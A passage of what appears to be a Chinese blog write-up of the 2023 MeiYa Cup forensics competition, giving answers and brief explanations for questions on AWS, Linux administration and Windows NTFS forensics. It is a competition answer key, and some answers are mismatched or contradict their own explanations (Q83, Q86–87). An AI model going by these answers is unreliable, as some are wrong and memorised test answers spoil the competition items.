src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca66.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca66.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a66"></p><h5 id="67-单选题-哪一行代码的是负责更新在github使用中的-journal-文件的更新历史记录1分"><a class="markdownIt-Anchor" href="#67-单选题-哪一行代码的是负责更新在github使用中的-journal-文件的更新历史记录1分">#</a> 67. [单选题] 哪一行代码的是负责更新在 GitHub 使用中的 .journal 文件的更新历史记录？(1 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca67.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca67.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a67"></p><p>A. 08</p><p>B. 13</p><p>C. 16</p><p>D. 17</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>git commit 是提交更改，-m 是指定消息</p><h5 id="68-单选题-下列哪一行aws-s3-bucket授权策略中的设置有问题1分"><a class="markdownIt-Anchor" href="#68-单选题-下列哪一行aws-s3-bucket授权策略中的设置有问题1分">#</a> 68. [单选题] 下列哪一行 AWS S3 Bucket 授权策略中的设置有问题？(1 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca68.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca68.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a68"></p><p>A. 2</p><p>B. 7</p><p>C. 8</p><p>D. 9</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>“Principal”:&quot;*&quot;。这个 * 即通配符，意为允许任何人访问，这是很危险的设置。</p><h5 id="69-单选题-以下哪项是多重身份验证-mfa-的示例1分"><a class="markdownIt-Anchor" href="#69-单选题-以下哪项是多重身份验证-mfa-的示例1分">#</a> 69. [单选题] 以下哪项是多重身份验证 (MFA) 的示例？(1 分)</h5><p>A. PIN 码和软件令牌</p><p>B. 指纹和视网膜扫描</p><p>C. 用户名和密码</p><p>D. 一次性短信代码和硬件令牌</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><h5 id="70-单选题-aws用家在户口网络进行设定而这些设定会记录用户或第三者的活动-第-11-行代码中的设定可以找到哪些用户或第三者的活动信息2分"><a class="markdownIt-Anchor" href="#70-单选题-aws用家在户口网络进行设定而这些设定会记录用户或第三者的活动-第-11-行代码中的设定可以找到哪些用户或第三者的活动信息2分">#</a> 70. [单选题] AWS 用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第 11 行代码中的设定可以找到哪些用户或第三者的活动信息？(2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca69.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca69.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a69"></p><p>A. User Name 用户的名称</p><p>B. User Source 用户的来源</p><p>C. Attacker Name 攻击者的名称</p><p>D. Attacker Source 攻击者的来源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>蜜罐 opencanary 这个就不是给正常用户登录的，能给它发请求的大多都是攻击者。sources 的这个文件名就已经说明是记录来源了。</p><h5 id="71-单选题-aws用户设置了一个vpcip地址范围为10000-100024-下列哪个-ip-地址用于-dns2分"><a class="markdownIt-Anchor" href="#71-单选题-aws用户设置了一个vpcip地址范围为10000-100024-下列哪个-ip-地址用于-dns2分">#</a> 71. [单选题] AWS 用户设置了一个 VPC，IP 地址范围为 10.0.0.0-10.0.0.24。下列哪个 IP 地址用于 DNS？(2 分)</h5><p>A. 10.0.0.0</p><p>B. 10.0.0.1</p><p>C. 10.0.0.2</p><p>D. 10.0.0.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>VPC 有自己的一套配置规则，不能套用常规的计网知识</p><p>在具有 CIDR 块 10.0.0.0/24 的子网中，以下五个 IP 地址是保留的：<br>10.0.0.0：网络地址。<br>10.0.0.1：由 AWS 保留，用于 VPC 路由器。<br>10.0.0.2：由 AWS 保留。DNS 服务器的 IP 地址是 VPC 网络范围的基址 + 2。对于包含多个 CIDR 块的 VPC，<br>DNS 服务器的 IP 地址位于主要 CIDR 中。我们还为 VPC 中的所有 CIDR 块预留了每个子网范围加二的基址。<br>10.0.0.3：由 AWS 保留，供将来使用。<br>10.0.0.255：网络广播地址。我们在 VPC 中不支持广播，因此我们会保留此地址。</p><h5 id="72-单选题-以下哪种类型的云服务用于操作系统和网络-1分"><a class="markdownIt-Anchor" href="#72-单选题-以下哪种类型的云服务用于操作系统和网络-1分">#</a> 72. [单选题] 以下哪种类型的云服务用于操作系统和网络？ (1 分)</h5><p>A. 软件即服务</p><p>B. 平台即服务</p><p>C. 基础架构即服务</p><p>D. 数据即服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><h5 id="73-单选题-以下哪项是bastionhost的特点-2分"><a class="markdownIt-Anchor" href="#73-单选题-以下哪项是bastionhost的特点-2分">#</a> 73. [单选题] 以下哪项是 Bastionhost 的特点？ (2 分)</h5><p>A. 包含敏感信息</p><p>B. 无法访问内部系统</p><p>C. 限制暴露的服务</p><p>D. 没有连接到互联网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>Bastionhost 是一种位于安全网络边界的服务器，用于提供对内部网络的访问控制。它的主要特点是限制暴露的服务，即只暴露必要的服务和端口，以减少潜在的攻击面。Bastionhost 通常用于跳板或代理访问内部系统，以增加对内部网络的安全性。</p><h5 id="74-单选题-在linux系统中哪个命令可以用于创建文件系统-1分"><a class="markdownIt-Anchor" href="#74-单选题-在linux系统中哪个命令可以用于创建文件系统-1分">#</a> 74. [单选题] 在 Linux 系统中，哪个命令可以用于创建文件系统？ (1 分)</h5><p>A. mount /dev/sda3 /mnt/usb</p><p>B. mkfs-ext4 /dev/sda2</p><p>C. mkfs-ext3 /sys/sda1</p><p>D. pvcreate /dev/sda</p><p>E. genfstab -U -p /mnt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><h5 id="75-单选题-link实际上是指向linux系统中另一个文件或文件夹的指标-以下哪个命令可以产生以下结果-2分"><a class="markdownIt-Anchor" href="#75-单选题-link实际上是指向linux系统中另一个文件或文件夹的指标-以下哪个命令可以产生以下结果-2分">#</a> 75. [单选题] 'Link’实际上是指向 LINUX 系统中另一个文件或文件夹的指标。以下哪个命令可以产生以下结果？ (2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca70-1730423109010-13.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca70-1730423109010-13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a70"></p><p>A. link -s testing.txt shotcut-testing.txt</p><p>B. ln -s shotcut.txt testing.txt</p><p>C. ln testing.txt shotcut-testing.txt</p><p>D. ln -s testing.txt shotcut-testing.txt</p><p>E. ln shotcut.txt testing.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>-s 是软链接参数，但是因为两个文件大小一样，所以是硬链接，shotcut 是快照的意思，所以应该是 shotcut-testing.txt 作为链接文件。</p><h5 id="76-单选题-以下哪个命令用于在linux系统中创建分区-1分"><a class="markdownIt-Anchor" href="#76-单选题-以下哪个命令用于在linux系统中创建分区-1分">#</a> 76. [单选题] 以下哪个命令用于在 Linux 系统中创建分区？ (1 分)</h5><p>A. gdisk /dev/sde</p><p>B. mke2fs /dev/sdb1 -t ext4</p><p>C. mount /dev/sdc1 /mnt/fs_home</p><p>D. fdisk -lu</p><p>E. lvcreate -l +200 /dev/vg00/log/vol-00</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>gdisk 是一个用于 GPT 磁盘分区的工具。</p><h5 id="77-单选题-一个系统管理员要扩展运行在lvm系统中的服务器存储-以下哪个命令可以用于扩展lvm中的逻辑卷-1分"><a class="markdownIt-Anchor" href="#77-单选题-一个系统管理员要扩展运行在lvm系统中的服务器存储-以下哪个命令可以用于扩展lvm中的逻辑卷-1分">#</a> 77. [单选题] 一个系统管理员要扩展运行在 LVM 系统中的服务器存储。以下哪个命令可以用于扩展 LVM 中的逻辑卷？ (1 分)</h5><p>A. lvdisplay /dev/vg02/vol-01</p><p>B. lvcreate -n /dev/vg02 -l 200</p><p>C. lvextend -n /dev/vg02 -l +200</p><p>D. lvscan -l +200 /dev/vg02/vol-01</p><p>E. lvresize -l +200 /dev/vg02/vol-01</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E</span><br></pre></td></tr></table></figure><p>lvresize 命令用于调整逻辑卷的大小，选项 - l + 200 表示将逻辑卷扩展 200 个逻辑区或扇区大小</p><h5 id="78-单选题-一个系统管理员编写了一个bash代码来构建一个raid系统将要实现什么类型的raid-2分"><a class="markdownIt-Anchor" href="#78-单选题-一个系统管理员编写了一个bash代码来构建一个raid系统将要实现什么类型的raid-2分">#</a> 78. [单选题] 一个系统管理员编写了一个 bash 代码来构建一个 RAID 系统，将要实现什么类型的 RAID？ (2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca71.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca71.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a71"></p><p>A. RAID 0</p><p>B. RAID 1</p><p>C. RAID 1+0</p><p>D. RAID 0+1</p><p>E. 这个代码不起作用 (No effect)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>先创建了两个 raid 1，然后创建了一个 raid 0 所以是 raid 1+0</p><h5 id="79-单选题-以下是运行在linux服务器中的服务清单-以下哪个命令可以关闭bluetoothservice服务-3分"><a class="markdownIt-Anchor" href="#79-单选题-以下是运行在linux服务器中的服务清单-以下哪个命令可以关闭bluetoothservice服务-3分">#</a> 79. [单选题] 以下是运行在 LINUX 服务器中的服务清单。以下哪个命令可以关闭 “bluetooth.service” 服务？ (3 分)</h5><p>A. systemctl kill bluetooth.service</p><p>B. systemctl disable bluetooth.service</p><p>C. systemctl down bluetooth.service</p><p>D. systemctl stop bluetooth.service</p><p>E. systemctl rm bluetooth.service</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><h5 id="80-单选题-cron服务在linux系统中充当作业调度程序-现在准备启动和关闭一个web服务器httpdservice上午8时30分启动-下午6时06分关闭周一至周五以下哪个crontab设置适用于这种情况-1分"><a class="markdownIt-Anchor" href="#80-单选题-cron服务在linux系统中充当作业调度程序-现在准备启动和关闭一个web服务器httpdservice上午8时30分启动-下午6时06分关闭周一至周五以下哪个crontab设置适用于这种情况-1分">#</a> 80. [单选题] cron 服务在 LINUX 系统中充当作业调度程序。现在准备启动和关闭一个 Web 服务器（httpd.service），上午 8 时 30 分（启动）- 下午 6 时 06 分（关闭）；周一至周五，以下哪个 crontab 设置适用于这种情况？ (1 分)</h5><p>A. 30 8 * 1-5 * /usr/bin/systemctl start httpd.service 及 06 18 * 1-5 * /usr/bin/systemctl stop httpd.service</p><p>B. 30 8 * * 1-5 /usr/bin/systemctl start httpd.service 及 06 18 * * 1-5 /usr/bin/systemctl stop httpd.service</p><p>C. 30 8 1-5 * */usr/bin/systemctl start httpd.service 及 06 18 1-5 * */usr/bin/systemctl stop httpd.service</p><p>D. 30 8 * * * /usr/bin/systemctl start httpd.service 及 06 18 * * * /usr/bin/systemctl stop httpd.service</p><p>E. 以上都不是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>查询得到以下知识点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cron 的定时任务需要在作业文件中设定执行时间，包括时分秒、天数等，一共 7 个部分，格式如下：</span><br><span class="line"></span><br><span class="line">分 时 日 月 星期 年 命令</span><br><span class="line"></span><br><span class="line">其中：</span><br><span class="line"></span><br><span class="line">分：必须，可选 0-59，可设置 ,-*/ 特殊字符</span><br><span class="line"></span><br><span class="line">时：必须，可选 0-23，可设置 ,-*/ 特殊字符</span><br><span class="line"></span><br><span class="line">日：必须，可选 1-31，可设置 ,-*?/LW 特殊字符</span><br><span class="line"></span><br><span class="line">月：必须，可选 1-12或 jan-dec，可设置 ,-*/ 特殊字符</span><br><span class="line"></span><br><span class="line">星期：必须，可选 0-7 或 sun-sta，可设置 ,-*?/L# 特殊字符</span><br><span class="line"></span><br><span class="line">年：非必须，可留空，可设置 1970-2099，可设置 ,-*/ 特殊字符</span><br><span class="line"></span><br><span class="line">cron服务几个特殊字符的含义如下：</span><br><span class="line"></span><br><span class="line">\* 全部。意思是在该时间的任意点都应当执行?不指定，任意。仅用于 日(月)和日(周)。0 0 5 *</span><br><span class="line"></span><br><span class="line">? 代表每个月的第5天零点，不论星期几。0 0 ? * 1 代表每周一，不论是当月的哪天。</span><br><span class="line"></span><br><span class="line">, 多个值的[分隔符](https://zhida.zhihu.com/search?content_id=166581347&amp;content_type=Article&amp;match_order=1&amp;q=分隔符&amp;zhida_source=entity)，例如1,5,10</span><br><span class="line"></span><br><span class="line">\- 代表连续值，例如1-20</span><br><span class="line"></span><br><span class="line">/ 步长。例如 5/15，代表从5开始，以15为步长。因此，当5/15位于分钟的位置时，表示小时内的第5、20、35和50分钟。</span><br><span class="line"></span><br><span class="line">L 最后一天。可以是每月最后一天或者每周最后一天。如果用在 天(周)字段，并且前面加数字，则表示最后一个周N。例如5L，表示最后一个周五（5表示周五，L表示最后）。</span><br><span class="line"></span><br><span class="line">W 工作日，指周一到周五的任意一天</span><br><span class="line"></span><br><span class="line">\# 表示第几个的意思，例如 6#3，表示当月第3个星期六（6表示周六，3表示第3个）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="81-单选题-以下哪个linux命令可以显示目录中的所有文件包括隐藏文件-1分"><a class="markdownIt-Anchor" href="#81-单选题-以下哪个linux命令可以显示目录中的所有文件包括隐藏文件-1分">#</a> 81. [单选题] 以下哪个 Linux 命令可以显示目录中的所有文件，包括隐藏文件？ (1 分)</h5><p>A. ls -ls</p><p>B. ls -asl</p><p>C. ls -lAs | wc</p><p>D. ls -als | grep ssh</p><p>E. None</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><h5 id="82-单选题-如果您想要检查linux系统上可用的剩余磁盘空间量您会使用以下哪个命令-1分"><a class="markdownIt-Anchor" href="#82-单选题-如果您想要检查linux系统上可用的剩余磁盘空间量您会使用以下哪个命令-1分">#</a> 82. [单选题] 如果您想要检查 Linux 系统上可用的剩余磁盘空间量，您会使用以下哪个命令？ (1 分)</h5><p>A. df -vh</p><p>B. df -sh</p><p>C. dl -vh</p><p>D. dd -sh</p><p>E. dt -vh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>开个虚拟机试一下就好</p><h5 id="83-单选题-dockerfile是一个文本文档用于在docker架构中生成哪个组件-1分"><a class="markdownIt-Anchor" href="#83-单选题-dockerfile是一个文本文档用于在docker架构中生成哪个组件-1分">#</a> 83. [单选题] Dockerfile 是一个文本文档，用于在 Docker 架构中生成哪个组件？ (1 分)</h5><p>A. docker engine</p><p>B. image</p><p>C. container</p><p>D. volumes</p><p>E. docker network</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>dockerfile 用于生成 Docker 的镜像，而不是容器本身。</p><h5 id="84-单选题-在linux系统中哪个不是内存区-1分"><a class="markdownIt-Anchor" href="#84-单选题-在linux系统中哪个不是内存区-1分">#</a> 84. [单选题] 在 Linux 系统中，哪个不是内存区？ (1 分)</h5><p>A. [heap]</p><p>B. [stack]</p><p>C. [paging]</p><p>D. [vvar]</p><p>E. [vdso]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>heap,stack 即堆栈，vvar 是存储系统变量的区域，vdso 存储特定系统调用的代码的内存区域，允许用户在用户空间进行调用而不用进入内核空间。paging 是把物理内存映射到虚拟内存的技术，本身并不是内存区。</p><h5 id="85-单选题-以下命令中哪个命令可以对export-logs输出进行排序-1分"><a class="markdownIt-Anchor" href="#85-单选题-以下命令中哪个命令可以对export-logs输出进行排序-1分">#</a> 85. [单选题] 以下命令中，哪个命令可以对 &quot;export-logs&quot; 输出进行排序？(1 分)</h5><p>A. export-logs&lt;sort</p><p>B. export-logs&gt;sort</p><p>C. export-logs&amp;sort</p><p>D. export-logs|sort</p><p>E. export-logs&lt;&gt;sort</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><h5 id="86-多选题-哪些文件会影响linux主机的名称解析功能-1分"><a class="markdownIt-Anchor" href="#86-多选题-哪些文件会影响linux主机的名称解析功能-1分">#</a> 86. [多选题] 哪些文件会影响 Linux 主机的名称解析功能？ (1 分)</h5><p>A. /etc/resolv.conf</p><p>B. /etc/hosts</p><p>C. /etc/default/names</p><p>D. /etc/nsswitch.conf</p><p>E. /etc/inet/hosts</p><h5 id="87-单选题-哪个系统文件包含了一般的端口-关联的服务和协议-1分"><a class="markdownIt-Anchor" href="#87-单选题-哪个系统文件包含了一般的端口-关联的服务和协议-1分">#</a> 87. [单选题] 哪个系统文件包含了一般的端口、关联的服务和协议？ (1 分)</h5><p>A. /etc/services</p><p>B. /etc/sysconfig/network-scripts</p><p>C. /etc/services.conf</p><p>D. /etc/inet/hosts</p><p>E. Noneofthechoices</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABD</span><br></pre></td></tr></table></figure><p>A 配置 DNS 服务器，B 配置本地域名解析，C 不存在，D 配置 linux 系统的名称解析服务顺序，E 不存在</p><h5 id="88-填空题-在-windows-10-中-usersqqqqqdownloads视频文件mixkit-two-women-laying-together-925-mediummp4在mft-中分成多少个data-cluster-储存提示-请以阿拉伯数字作答-1分"><a class="markdownIt-Anchor" href="#88-填空题-在-windows-10-中-usersqqqqqdownloads视频文件mixkit-two-women-laying-together-925-mediummp4在mft-中分成多少个data-cluster-储存提示-请以阿拉伯数字作答-1分">#</a> 88 [填空题] 在 Windows 10 中 \Users\qqqqq\Downloads，视频文件 (mixkit-two-women-laying-together-925-medium.mp4) 在 MFT 中分成多少个 Data Cluster 储存？提示：请以阿拉伯数字作答 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><p>虚拟机文件本身无法直接导出 $MFT，所以先用取证大师把镜像打包成 dd</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca72.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca72.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a72"></p><p>用 Mft2Csv 分析 mft</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca73.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca73.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a73"></p><p><a href="https://blog.csdn.net/tanbinn/article/details/134527004">2023 美亚杯个人赛全题目复盘_数据安全竞赛复盘 - CSDN 博客</a></p><p>剩余步骤参考以上博客，我还没搞明白</p><h5 id="89-单选题-在-windows-10-中-usersqqqqqdownloads-mixkit-two-woman-laying-together-925-mediummp4-的last-access-时间是多少-1分"><a class="markdownIt-Anchor" href="#89-单选题-在-windows-10-中-usersqqqqqdownloads-mixkit-two-woman-laying-together-925-mediummp4-的last-access-时间是多少-1分">#</a> 89. [单选题] 在 Windows 10 中 \Users\qqqqq\Downloads\ mixkit-two-woman-laying-together-925-medium.mp4 的 last Access 时间是多少？(1 分)</h5><p>A. 2023/07/10 18:31:32</p><p>B. 2023/07/10 18:31:01</p><p>C. 2023/07/10 19:31:22</p><p>D. 2023/07/11 19:31:22</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>access 就是访问的意思，所以 last Access 就是最新的读取时间</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca74.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca74.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a74"></p><h5 id="90在-windows-7-中-usersallendesktop有1个mp3-文件-例unlock-me-149058mp3用户使用什么程序打开该mp3-文件-提示请以小写字母作答-1分"><a class="markdownIt-Anchor" href="#90在-windows-7-中-usersallendesktop有1个mp3-文件-例unlock-me-149058mp3用户使用什么程序打开该mp3-文件-提示请以小写字母作答-1分">#</a> 90. 在 Windows 7 中 \Users\Allen\Desktop，有 1 个 MP3 文件 (例:unlock-me-149058.mp3)，用户使用什么程序打开该 MP3 文件？提示：请以小写字母作答 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">potplayer</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca75.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca75.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a75"></p><h5 id="91-单选题-在-windows-7-中-usersallendesktop-有1个mp3-文件-unlock-me-149058mp3该文件的zone-identiflier为3-3代表哪一个security-zone-1分"><a class="markdownIt-Anchor" href="#91-单选题-在-windows-7-中-usersallendesktop-有1个mp3-文件-unlock-me-149058mp3该文件的zone-identiflier为3-3代表哪一个security-zone-1分">#</a> 91. [单选题] 在 Windows 7 中 ’ \Users\Allen\Desktop ‘有 1 个 MP3 文件 (unlock-me-149058.mp3)，该文件的 Zone identiflier 为’3’。'3’代表哪一个 security Zone? (1 分)</h5><p>A. Local Machine Zone</p><p>B. Internet Zone</p><p>C. Restricted Zone</p><p>D. Trust Site Zone</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>Zone Identifier 可以有以下几个值：</p><p>0：本地计算机</p><p>1：本地内网</p><p>2：受信任的站点</p><p>3：互联网</p><p>4：受限制的站点</p><h5 id="92-单选题-在-windows-7-中-usersallendesktop有1个mp3-文件-unlock-me-149058mp3该文件从哪个网站下载-1分"><a class="markdownIt-Anchor" href="#92-单选题-在-windows-7-中-usersallendesktop有1个mp3-文件-unlock-me-149058mp3该文件从哪个网站下载-1分">#</a> 92. [单选题] 在 Windows 7 中 \Users\Allen\Desktop 有 1 个 MP3 文件 (unlock-me-149058.mp3)，该文件从哪个网站下载？(1 分)</h5><p>A. <a href="http://www.Pixbay.com">www.Pixbay.com</a></p><p>B. <a href="http://free-mp3-download.net/">free-mp3-download.net/</a></p><p>C. <a href="https://mp3juices.nu">https://mp3juices.nu</a></p><p>D. <a href="http://mygomp3.com">mygomp3.com</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><p>google 的下载记录中没有就去缓存中搜索，url 过滤 unlock-me-149058.mp3 即可搜到</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca76.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca76.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a76"></p><h5 id="93-单选题-在-windows-7-中-usersallendownloads-内有mp3文件-miraclemp3-更改名称时间-2分"><a class="markdownIt-Anchor" href="#93-单选题-在-windows-7-中-usersallendownloads-内有mp3文件-miraclemp3-更改名称时间-2分">#</a> 93. [单选题] 在 Windows 7 中 \Users\Allen\Downloads 内有 mp3 文件 (miracle.mp3), 更改名称时间？(2 分)</h5><p>A. 2023-07-13 02:55:20</p><p>B. 2023-07-15 10:55:20</p><p>C. 2023-07-12 10:58:04</p><p>D. 2023-07-13 10:55:20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca77.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca77.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a77"></p><p>ntfs 日志分析</p><h5 id="94-填空题-在-windows-7-中-usersallendownloads-内有mp3文件-miraclemp3-mp3文件更改名称前的名称是什么-提示-请以与记录相同的名称与文件格式作答-1分"><a class="markdownIt-Anchor" href="#94-填空题-在-windows-7-中-usersallendownloads-内有mp3文件-miraclemp3-mp3文件更改名称前的名称是什么-提示-请以与记录相同的名称与文件格式作答-1分">#</a> 94. [填空题] 在 Windows 7 中 \Users\Allen\Downloads 内有 mp3 文件 (miracle.mp3), mp3 文件更改名称前的名称是什么？提示：请以与记录相同的名称与文件格式作答 (1 分)</h5><figure class="highlight 